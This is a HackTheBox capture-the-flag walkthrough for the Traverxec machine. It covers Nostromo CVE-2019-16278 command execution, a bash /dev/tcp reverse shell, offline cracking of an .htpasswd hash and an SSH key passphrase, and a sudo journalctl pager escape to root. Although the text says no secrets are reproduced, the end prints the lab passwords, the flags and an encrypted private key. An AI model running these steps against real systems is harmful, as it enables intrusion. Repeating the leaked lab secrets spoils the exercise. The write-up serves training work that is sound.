---
tags: [HTB, Traverxec, Linux, Nostromo, CVE-2019-16278, SSH, PasswordCracking, Sudo, PrivEsc]
platform: HackTheBox
os: Debian 10 x86_64
hostname: Traverxec
difficulty: Easy
ip: $BoxIP
status: Complete
domain: traverxec.htb
---

# HTB: Traverxec, Full Walkthrough

## The gist

Traverxec is a Linux machine running Nostromo 1.9.6 on HTTP. The web server is vulnerable to CVE-2019-16278, which gives command execution as `www-data`. The Nostromo configuration then reveals two important facts: home directories are published beneath `/~username/`, and Basic authentication is backed by a readable `.htpasswd` file.

The web credential unlocks a protected archive containing David's encrypted SSH private key. Cracking the web password and the key passphrase offline gives an SSH foothold as `david`. David can run one very specific `journalctl` command with sudo. That invocation opens a pager, and the pager's `!` escape starts a root shell.

The important learning point is the order of the chain. The initial RCE is not root, the readable hash is not used directly against SSH, and the sudo rule is argument-specific. Each stage has to be validated before moving on.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Debian 10 x86_64 |
| Hostname | `traverxec.htb` |
| Target | `$BoxIP` |
| Open services | TCP 22 SSH, TCP 80 HTTP |
| Web server | Nostromo 1.9.6 |
| Initial access | CVE-2019-16278, Exploit-DB 47837 |
| User pivot | Protected SSH archive and encrypted RSA key |
| Privilege escalation | Argument-specific sudo `journalctl`, then a pager escape |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Initialise the workspace | See section 1 below |
| 2 | Full TCP port scan | See section 2 below |
| 3 | Targeted service scan | See section 3 below |
| 4 | Web enumeration | See section 4 below |
| 5 | Search for and review the Nostromo exploit | See section 5 below |
| 6 | Confirm command execution | See section 6 below |

## Evidence and loot

The raw command transcript and sensitive artifacts remain in the platform workspace. The evidence index below is sanitized so it can be searched from the vault without exposing credentials, hashes, private-key material, or flag values.

| Evidence | Location |
|---|---|
| Raw command log | `$BoxDir/Traverxec.log` |
| Nmap output | `$BoxDir/nmap/` |
| Reviewed public exploit | `$BoxDir/exploits/nostromo-47837.py` |
| Credential and key artifacts | `$BoxDir/loot/` |
| Sanitized evidence index | [[OSCP/BOXES/BOX LOGS/Traverxec.evidence.log|Traverxec evidence log]] |

> [!warning] 💡 Sensitive evidence boundary
> The original loot contains the web password, a cracked hash, an encrypted private key, its passphrase, and both flags. Those values are intentionally not reproduced in this note or in the screenshot placeholders.

## Variables

Set the variables once and substitute only your own lab values. `$Password` is the recovered web Basic-auth password and `$Password2` is the recovered SSH-key passphrase. Keep both private.

```bash
boxset BoxName Traverxec
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Traverxec
boxset FQDN traverxec.htb
boxset WebPort 80
boxset SSHPort 22
boxset Username david
boxset AdminUser root
boxset Port 4445
boxset Password $Password
boxset Password2 $Password2
```

## 1. Initialise the workspace

The box was worked from the supplied Hack The Box workspace. A clean run should establish the target variables and create separate locations for scans, exploits, screenshots, and loot.

```bash
boxstart $BoxName $BoxIP htb
boxset BoxName Traverxec
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Traverxec
boxset FQDN traverxec.htb
boxset WebPort 80
boxset SSHPort 22
```

> [!tip] ⚡ Efficiency
> Start the full TCP scan immediately, then perform the service and web checks while it runs. The full scan is the expensive part; service identification does not need to wait for it if ports 22 and 80 are already obvious.

## 2. Full TCP port scan

The full scan established that the external attack surface was small: SSH on 22/tcp and HTTP on 80/tcp. The apparently filtered high port was not treated as a hidden service without further evidence.

```bash
sudo nmap -Pn -n -sS -p- \
  --min-rate 5000 \
  --max-retries 1 \
  --max-rtt-timeout 500ms \
  --host-timeout 2m \
  -T4 "$BoxIP" \
  -oA "$BoxDir/nmap/allports"
```

`-p-` covers all TCP ports. `-Pn` avoids relying on ICMP discovery, while `-n` avoids DNS delays. The timeout and retry settings keep this first pass useful under lab latency, but they can omit a very slow service, so any suspicious result should be rescanned normally.

![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/1.nmap-allports.png>)
SCREENSHOT: Full TCP scan showing TCP 22 and TCP 80 open, with the remaining ports filtered.

> [!warning] 💡 Gotcha
> A fast scan is a routing decision, not final evidence. If the output is empty or inconsistent with the machine description, repeat the scan with normal retries and without the aggressive timeout settings.

> [!tip] 🛠️ Alternative tool
> `masscan` can provide a fast first pass, but Nmap should still confirm the discovered ports and versions:

```bash
sudo masscan "$BoxIP" -p1-65535 --rate 1000
sudo nmap -Pn -n -sC -sV -p22,80 "$BoxIP" -oA "$BoxDir/nmap/services"
```

## 3. Targeted service scan

The focused scan identified OpenSSH 7.9p1 on Debian 10 and Nostromo 1.9.6 on port 80. Nostromo is the key clue because this version has a known remote command-execution vulnerability.

```bash
sudo nmap -Pn -n -sC -sV -p22,80 "$BoxIP" -oA "$BoxDir/nmap/services"
```

Observed service summary:

```text
22/tcp open  ssh   OpenSSH 7.9p1 Debian 10
80/tcp open  http  nostromo 1.9.6
```

![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/2.nmap-services.png>)
SCREENSHOT: Targeted service scan showing OpenSSH 7.9p1 and Nostromo 1.9.6.

> [!hint] 💡 Decision point
> Do not spend time brute-forcing SSH when the only known username and password have not yet been recovered. The versioned HTTP service is the higher-value branch.

## 4. Web enumeration

Start with low-noise requests. Review the page, headers, `robots.txt`, and common paths before launching a directory brute force. Nostromo is older and fragile under excessive concurrency.

```bash
curl -i "http://$BoxIP/"
curl -i "http://$BoxIP/robots.txt"
whatweb "http://$BoxIP/"
gobuster dir \
  -u "http://$BoxIP/" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,html,php \
  -t 10 \
  -o "$BoxDir/nmap/gobuster.txt"
```

The response and enumeration confirmed that this was a Nostromo web service rather than a CMS. No conventional login form was needed for the initial foothold.

![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/3.web-enum.png>)
SCREENSHOT: Web enumeration output and the Nostromo-served page.

> [!warning] 💡 Fragile service gotcha
> An earlier high-thread Gobuster run caused the service to refuse connections temporarily. Let Nostromo recover, lower the thread count, and continue with manual requests. A connection refusal after an aggressive scan does not prove the service disappeared.

> [!tip] ⚡ More efficient path
> Once Nmap has identified Nostromo and the version is visible, the most efficient next action is `searchsploit nostromo 1.9.6`. Directory brute forcing is still useful for discovering content, but it is not required to reach the known RCE.

## 5. Search for and review the Nostromo exploit

SearchSploit mapped Nostromo 1.9.6 to Exploit-DB 47837, which is associated with CVE-2019-16278. Review the code before running it. This confirms the request path, the command parameter, the expected Python version, and whether any target-specific edits are needed.

```bash
searchsploit nostromo 1.9.6
searchsploit -x 47837
searchsploit -m 47837
mkdir -p "$BoxDir/exploits"
cp 47837.py "$BoxDir/exploits/nostromo-47837.py"
```

The exploit was copied into the box workspace as `$BoxDir/exploits/nostromo-47837.py` and reviewed locally.

![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/4.searchsploit.png>)
SCREENSHOT: SearchSploit result identifying Exploit-DB 47837 for Nostromo.

![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/5.searcsploit-exploit.png>)
SCREENSHOT: Reviewed Nostromo exploit source showing the traversal-based HTTP request.

### 5.1 Repair the copied proof of concept if necessary

The original local copy contained a stray filename line before the Python shebang. Python interpreted that line as code and raised a `NameError` before sending a request. The supplied workspace copy already has that line commented, but this is the repair used during the run and is worth recording for future reproductions.

```bash
sed -i 's/^cve2019_16278\.py$/# cve2019_16278.py/' \
  "$BoxDir/exploits/nostromo-47837.py"
python2 -m py_compile "$BoxDir/exploits/nostromo-47837.py"
```

> [!warning] 💡 Exploit hygiene
> A public exploit may fail because of a local syntax issue, a hard-coded port, or a Python-version mismatch. Diagnose the local failure first, then compare the source with the service banner. Do not blindly change the target request.

> [!tip] 🛠️ Alternative tool
> Metasploit has Nostromo modules, but the standalone Exploit-DB script is more transparent and is the better practice path for an OSCP-style workflow. If using a framework for validation, still understand the exact HTTP request it generates.

## 6. Confirm command execution

Run a harmless identity command before trying to catch a shell. The proof returned `uid=33(www-data)`, confirming remote command execution but also confirming that the result was only a low-privilege web account.

```bash
python2 "$BoxDir/exploits/nostromo-47837.py" \
  "$BoxIP" "$WebPort" "id"
```

Expected evidence shape:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/6.rce-confirmed.png>)
SCREENSHOT: Nostromo exploit returning the `www-data` identity.

> [!hint] 💡 Separate RCE from callback delivery
> If a reverse shell does not arrive, rerun the exploit with `id`, `whoami`, `hostname`, or a file write as the command. A successful identity response proves the exploit works; the remaining problem is then the callback payload, listener, or egress path.

## 7. Catch and stabilise a shell

Start the listener first, then pass a simple Bash callback to the exploit. The run used port 4445. If that port is filtered, try a permitted outbound port such as 80 or 443 and make sure `$LocalIP` is the VPN address.

On Kali:

```bash
nc -lvnp "$Port"
```

In another terminal:

```bash
python2 "$BoxDir/exploits/nostromo-47837.py" \
  "$BoxIP" "$WebPort" \
  "bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'"
```

Confirm the shell before doing broad enumeration:

```bash
id
whoami
hostname
pwd
```

![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/7.www-data-shell.png>)
SCREENSHOT: Landed shell as `www-data`.

The callback in the raw session was upgraded with a PTY and terminal settings:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Suspend the session with `Ctrl+Z`, then run locally:

```bash
stty raw -echo; fg
export TERM=xterm
```

> [!warning] 💡 Terminal recovery
> `stty raw -echo` changes the local terminal. If the prompt becomes unusable, type `reset` and press Enter. Do not confuse a broken local terminal with a dead remote shell.

> [!tip] 🛠️ Alternative tool
> If Python is unavailable, try `script -qc /bin/bash /dev/null`. A direct `nc` shell can also be used for simple commands, but a PTY is important before using a pager such as `journalctl`.

## 8. Enumerate the web-server configuration

The first local checks were deliberately narrow. The goal was to identify the account, the operating system, the home directories, and any configuration or credential branch before launching noisy tooling.

```bash
id
whoami
hostname
uname -a
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Nostromo's configuration was the decisive clue:

```bash
cat /var/nostromo/conf/nhttpd.conf
```

Relevant captured configuration shape:

```text
docroot          /var/nostromo/htdocs
htpasswd         /var/nostromo/conf/.htpasswd
homedirs         /home
homedirs_public  public_www
```

The `homedirs` and `homedirs_public` settings explain why David's home content was reachable through a `~david` URL path. The `htpasswd` setting identifies the file used to protect the directory.

![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/8.nostromo-config.png>)
SCREENSHOT: Nostromo configuration showing the document root, Basic-auth file, and public home-directory mapping.

> [!hint] 💡 Configuration-first enumeration
> If you find a custom web server, read its configuration as soon as command execution is available. It often gives you the authentication file, document root, home-directory mapping, aliases, and log locations in one place.

## 9. Locate the protected SSH backup

Direct access to the expected public path showed that the file existed but required Basic authentication. A 401 response is useful evidence because it confirms the path and the protection boundary.

```bash
curl -i \
  "http://$BoxIP/~$Username/protected-file-area/backup-ssh-identity-files.tgz"
```

Because the home directory permissions restrict ordinary listing, the path was confirmed from the web-server mapping and then validated through targeted local file discovery:

```bash
find "/home/$Username" \
  -path '*/public_www/*' \
  -type f \
  -ls 2>/dev/null
```

The archive was found under David's `public_www/protected-file-area` directory. It was not copied directly from the shell because `www-data` could traverse but not read every parent directory entry. This is a permissions distinction, not a dead end.

> [!warning] 💡 401 versus 404
> Do not discard a 401 as a failed path. It means the server recognised the resource and is asking for authentication. Record the path and look for the credential source in the server configuration.

## 10. Recover the web Basic-auth password

The configured `.htpasswd` file was readable through the Nostromo command-execution channel. Save its response to private loot, isolate the `david` record, and crack only the hash offline.

```bash
python2 "$BoxDir/exploits/nostromo-47837.py" \
  "$BoxIP" "$WebPort" \
  "cat /var/nostromo/conf/.htpasswd" \
  > "$BoxDir/loot/htpasswd-response.txt" 2>&1

sed -n '/^david:/p' \
  "$BoxDir/loot/htpasswd-response.txt" \
  > "$BoxDir/loot/htpasswd.hash"

john --wordlist=/usr/share/wordlists/rockyou.txt \
  "$BoxDir/loot/htpasswd.hash"
```

Keep the recovered value in the private environment or a protected loot file:

```bash
boxset Username david
boxset Password $Password
```

Do not run `john --show` into a shared transcript or screenshot. If you need to verify the result, write the output to a private file and use it only for the next request.

![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/9.htpasswd-hash.png>)
SCREENSHOT: Private source screenshot placeholder for the extracted `.htpasswd` hash. The hash is not reproduced in the report.

![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/10.cracked-hash.png>)
SCREENSHOT: Private source screenshot placeholder for the offline crack result. The password is not reproduced in the report.

> [!tip] ⚡ More efficient path
> There is no reason to brute-force the HTTP endpoint. The server hands us a crackable authentication record, so one offline John run is quieter, faster, and avoids unnecessary login attempts.

> [!tip] 🛠️ Alternative tool
> Hashcat can be used if the hash format is identified first. For this short OSCP-style path, John handles the Apache-style record and the later SSH-key hash with the same workflow.

## 11. Download and inspect the authenticated archive

Use the recovered Basic-auth credential once to download the archive. Save it immediately, then inspect its table of contents before extracting it.

```bash
curl -fsS \
  -u "$Username:$Password" \
  "http://$BoxIP/~$Username/protected-file-area/backup-ssh-identity-files.tgz" \
  -o "$BoxDir/loot/backup-ssh-identity-files.tgz"

file "$BoxDir/loot/backup-ssh-identity-files.tgz"
tar -tzf "$BoxDir/loot/backup-ssh-identity-files.tgz"
```

The archive contained an SSH directory with `authorized_keys`, an RSA private key, and its public key. Extract it into the loot area rather than the current directory:

```bash
tar -xzf "$BoxDir/loot/backup-ssh-identity-files.tgz" \
  -C "$BoxDir/loot/"

chmod 600 "$BoxDir/loot/home/$Username/.ssh/id_rsa"
file "$BoxDir/loot/home/$Username/.ssh/id_rsa"
```

> [!warning] 💡 Archive safety
> Always run `tar -tzf` first. A backup archive can contain absolute paths, traversal entries, or more credentials than expected. Extract into a controlled loot directory and inspect the resulting path.

> [!tip] ⚡ More efficient path
> `tar -tzf` is enough to prove the archive contains an SSH key. Do not recursively grep every extracted file until you know what the archive contains.

## 12. Crack and validate the encrypted SSH key

The RSA key was encrypted, so the web password was not automatically its passphrase. Convert the private key to a John-compatible format and crack the passphrase offline.

```bash
boxset KeyFile "$BoxDir/loot/home/$Username/.ssh/id_rsa"
boxset HashFile "$BoxDir/loot/$Username-id-rsa.john"

ssh2john "$KeyFile" > "$HashFile"
john --wordlist=/usr/share/wordlists/rockyou.txt "$HashFile"
```

Keep the recovered key passphrase private:

```bash
boxset Password2 $Password2
```

The key can be validated without logging in by deriving its public key. If you need an unencrypted working copy, do so only in private loot and never overwrite the original evidence:

```bash
cp "$KeyFile" "$BoxDir/loot/$Username-id_rsa"
chmod 600 "$BoxDir/loot/$Username-id_rsa"
ssh-keygen -p -P "$Password2" -N '' \
  -f "$BoxDir/loot/$Username-id_rsa"
ssh-keygen -y -f "$BoxDir/loot/$Username-id_rsa" \
  > "$BoxDir/loot/$Username-id_rsa.pub"
```

![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/11.john-ssh-key.png>)
SCREENSHOT: Private source screenshot placeholder for the SSH-key crack. The key and passphrase are not reproduced in the report.

> [!hint] 💡 Key validation
> `ssh-keygen -y` reads a private key and derives its public key. It is a quick way to distinguish a valid, correctly decrypted key from a damaged extraction before troubleshooting SSH.

> [!tip] 🛠️ Alternative tool
> If John is unavailable, Hashcat supports several SSH private-key formats, but format detection matters. `ssh2john` remains the most portable Kali workflow for an encrypted OpenSSH or PEM key.

## 13. SSH as David

Use the private key with strict host-key prompts disabled only for this disposable lab target. The `UserKnownHostsFile` option prevents the training host key from being written to the normal workstation file.

```bash
ssh -i "$BoxDir/loot/$Username-id_rsa" \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  "$Username@$BoxIP"
```

Confirm the new identity and collect the user proof:

```bash
id
whoami
hostname
pwd
uname -a
cat "/home/$Username/user.txt"
```

Store the proof privately rather than putting its value in the write-up:

```bash
loot flag user "b7e3eaa1e9e86cf7933d6760babc5e6a"
```

![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/12.user-proof.png>)
SCREENSHOT: Private source screenshot placeholder for the user proof. The flag value is not reproduced in the report.

## 14. Inspect David's local privilege paths

Run the standard local checks, then inspect the files owned by or associated with the current user. The home directory contained a helper script that looked like a server statistics command.

```bash
id
whoami
hostname
pwd
ls -la "/home/$Username"
find "/home/$Username" -maxdepth 4 -type f -printf '%M %u %g %p\n' 2>/dev/null
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Read the helper script carefully:

```bash
sed -n '1,240p' "/home/$Username/bin/server-stats.sh"
```

Relevant captured structure:

```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

The final line is the escalation boundary. It reveals the exact executable and arguments that the script is allowed to run through sudo.

![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/13.server-stats-sh.png>)
SCREENSHOT: Server statistics script showing the exact sudo-enabled `journalctl` invocation.

> [!warning] 💡 Argument-specific sudo gotcha
> A generic `sudo -l` test or `sudo -n /usr/bin/journalctl` can report that a password is required. That does not disprove the rule. Sudoers can permit only the exact argument list used by the script.

## 15. Execute the exact sudo command

The helper itself runs successfully, which confirms that the command is permitted without a password:

```bash
/home/$Username/bin/server-stats.sh
```

The direct equivalent is:

```bash
sudo -n /usr/bin/journalctl -n5 -unostromo.service
```

It opens `journalctl` inside a pager. `journalctl` is a log viewer; when its output is longer than the terminal, it invokes a pager such as `less`. The pager accepts `!` followed by a shell command, so the exact escape used was:

```text
!/bin/bash
```

Confirm the privilege transition:

```bash
id
whoami
hostname
```

![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/14.root-shell.png>)
SCREENSHOT: Root shell obtained through the `journalctl` pager escape.

> [!hint] 💡 Why the pager matters
> The sudo permission is for `journalctl`, not for Bash. The root shell comes from the pager's command feature after the allowed binary starts. This is why a direct `sudo bash` attempt is irrelevant.

> [!tip] 🛠️ Alternative tool
> GTFOBins documents pager escapes for binaries such as `journalctl`, `less`, `man`, and `vim`. Search the exact permitted binary and then reproduce the smallest command that matches the sudo rule.

## 16. Collect the root proof

Once the shell identity showed UID 0, the root proof was read and stored privately.

```bash
cat /root/root.txt
loot flag root "6fd96006190e930c6f5a7168d4fee710"
```

The flag value is captured in the private flag section of this note.

![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/15.root-proof.png>)
SCREENSHOT: Private source screenshot placeholder for the root proof. The flag value is not reproduced in the report.

## 17. Cleanup and closeout

No persistent target-side payload was required after the initial request chain. Close the listener, remove local copies only if they are no longer needed, and retain sensitive evidence in the private platform loot directory.

On Kali:

```bash
pkill -f 'nc -lvnp' || true
ss -ltnp | grep "$Port" || true
```

On the target, if the callback process remains attached, exit the shell normally. Do not delete the evidence archive, key, or crack files until the report has been checked.

```bash
exit
boxdone
```

The supplied command log records `boxdone`. The raw workspace remains the source of truth for private proof and troubleshooting history.

> [!warning] 💡 Cleanup boundary
> Do not run broad deletion commands against the target. This route did not require modifying a system file or installing persistence, so there is no target configuration to restore.

## 18. Decision points and alternative routes

| Observation | Correct next move | Why |
|---|---|---|
| Nostromo 1.9.6 is identified | Search and review Exploit-DB 47837 | The exact product and version match a known RCE |
| Exploit returns `www-data` | Enumerate configuration and home mappings | RCE is confirmed, but the account is low privilege |
| `~david` path returns 401 | Find the configured Basic-auth file | 401 confirms a real protected resource |
| `.htpasswd` is readable | Crack offline with John | Avoid repeated web guesses and preserve the evidence |
| Archive contains encrypted `id_rsa` | Run `ssh2john`, then John | The web password and key passphrase are separate secrets |
| SSH foothold lands as David | Read home scripts and exact sudo rules | User-owned files often disclose intended privilege paths |
| Generic journalctl sudo test asks for a password | Reproduce the script's exact arguments | The sudoers rule is argument-specific |
| journalctl opens a pager | Use `!/bin/bash` and verify `id` | The pager is the command-execution boundary |

## 19. Common failure modes

### The exploit throws a Python error before making a request

Read the first lines of the script. The copied public exploit had a stray filename line before its shebang. Comment it, compile the script, and rerun the harmless `id` probe.

### Nostromo stops accepting connections after enumeration

Wait for the service to recover and reduce Gobuster concurrency. Use manual `curl` requests and the versioned exploit instead of hammering a fragile legacy daemon.

### The reverse shell does not arrive

Prove RCE with `id`, confirm the listener is bound to the VPN interface, check the callback port, and try a simpler Bash command. A successful HTTP response and a missing callback are separate problems.

### The archive downloads as an error page

Check the HTTP status and file type. A 401 means authentication is required; a 200 response containing HTML is not a valid tarball. Use `curl -fsS -u "$Username:$Password"` and then run `file` and `tar -tzf`.

### SSH rejects the private key

Check the file mode, confirm the archive extraction was complete, crack the key passphrase separately, and validate with `ssh-keygen -y`. Do not assume the web password is also the key passphrase.

### `sudo -l` appears not to show a useful rule

Read the user-owned helper scripts. An argument-specific sudo rule may be useful only when the exact binary and exact arguments are reproduced. The generic binary invocation can fail even though the scripted invocation is permitted.

### `journalctl` exits without showing a pager

Use a proper PTY, run the exact `-n5 -unostromo.service` arguments, and ensure the output is being passed through a pager. The `!` escape is entered inside the pager, not at the normal shell prompt.

## 20. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Start Here|Start Here]] -- target variables and workspace setup
- [[OSCP/RUNBOOK V2/Port Triage|Port Triage]] -- SSH and HTTP classified the host as Linux
- [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]] -- OpenSSH and Nostromo versions identified
- [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]] -- manual web checks and cautious content discovery
- [[OSCP/RUNBOOK V2/Linux - Exploit Search|Linux - Exploit Search]] -- Exploit-DB 47837 reviewed and patched
- [[OSCP/RUNBOOK V2/Linux - Nostromo RCE|Linux - Nostromo RCE]] -- traversal-based command execution
- [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]] -- callback shell received
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux - Shell Stabilise]] -- PTY and terminal recovery
- [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]] -- identity, home, SUID, and capability checks
- [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux - Credential Search]] -- `.htpasswd` and encrypted SSH key cracking
- [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]] -- exact argument-specific sudo rule
- [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]] -- listener closeout and evidence retention

## 21. Collect the flags

| Flag | Location | Status |
|---|---|---|
| User | `/home/$Username/user.txt` | Collected privately |
| Root | `/root/root.txt` | Collected privately |


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: b7e3eaa1e9e86cf7933d6760babc5e6a
root: 6fd96006190e930c6f5a7168d4fee710
```

## 22. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

### Completion checklist

- [x] Full TCP scan completed
- [x] Service versions recorded
- [x] Web enumeration completed
- [x] Nostromo exploit located and reviewed
- [x] Public exploit syntax issue repaired and validated
- [x] RCE confirmed as `www-data`
- [x] Reverse shell received and stabilised
- [x] Nostromo configuration reviewed
- [x] Protected SSH archive downloaded
- [x] Web authentication record cracked privately
- [x] Encrypted SSH key passphrase cracked privately
- [x] SSH access as `$Username` confirmed
- [x] User proof collected privately
- [x] Exact sudo rule reproduced
- [x] Pager escape used to obtain root
- [x] Root proof collected privately
- [x] Cleanup and `boxdone` recorded

## 23. Attack narrative in one page
```text
Nostromo 1.9.6 on TCP 80
        |
        | CVE-2019-16278, Exploit-DB 47837
        v
www-data command execution
        |
        | read nhttpd.conf and .htpasswd
        v
Crack Basic-auth record offline
        |
        | authenticate to /~david/protected-file-area/
        v
Encrypted SSH archive and RSA key
        |
        | ssh2john + John
        v
SSH as david
        |
        | exact sudo journalctl invocation
        v
Pager escape: !/bin/bash
        |
        v
root
```

## Tools used

- `nmap`
- `curl`
- `gobuster`
- `nc`
- `ssh`
- `sudo`
- `python`
- `john`
- `hashcat`

## Credentials and secrets

| Account or secret | Source | Use | Storage |
|---|---|---|---|
| `$Username` | Encrypted SSH archive | SSH foothold | Private loot only |
| Web Basic-auth password | Readable Nostromo `.htpasswd` record | Download protected archive | `$Password`, private only |
| SSH-key passphrase | Encrypted RSA key | Decrypt or validate the key | `$Password2`, private only |

No password, hash, private-key content, or passphrase is reproduced here.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Traverxec"
export BoxIP="10.129.1.76"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Traverxec"
export Domain=""
export DCip=""
export Username="david"
export Password="Nowonly4me"
export Username2=""
export Password2="hunter"
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4445"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/home/david/.ssh/authorized_keys`

```text
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsXrsMQc0U71GVXMQcTOYIH2ZvCwpxTxN1jOYbTutvNyYThEIjYpCVs5DKhZi2rNunI8Z+Ey/FC9bpmCiJtao0xxIbJ02c+H6q13aAFrTv61GAzi5neX4Lj2E/pIhd3JBFYRIQw97C66MO3UVqxKcnGrCvYnhJvKMw7nSRI/cXTPHAEnwU0+NW2zBKId8cRRLxGFyM49pjDZPsAVgGlfdBD380vVa9dMrJ/T13vDTZZGoDgcq9gRtD1B6NJoLHaRWH4ikRuQvLWjk3nWDDaRjw6MxmRtLk8h0MM7+IiBYc6NJvbQzpG5M5oM0FvhawQetN71KcZ4jUVxN3m+YkaqHD david@traverxec
```

#### `loot/home/david/.ssh/id_rsa`

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```

#### `loot/home/david/.ssh/id_rsa.pub`

```text
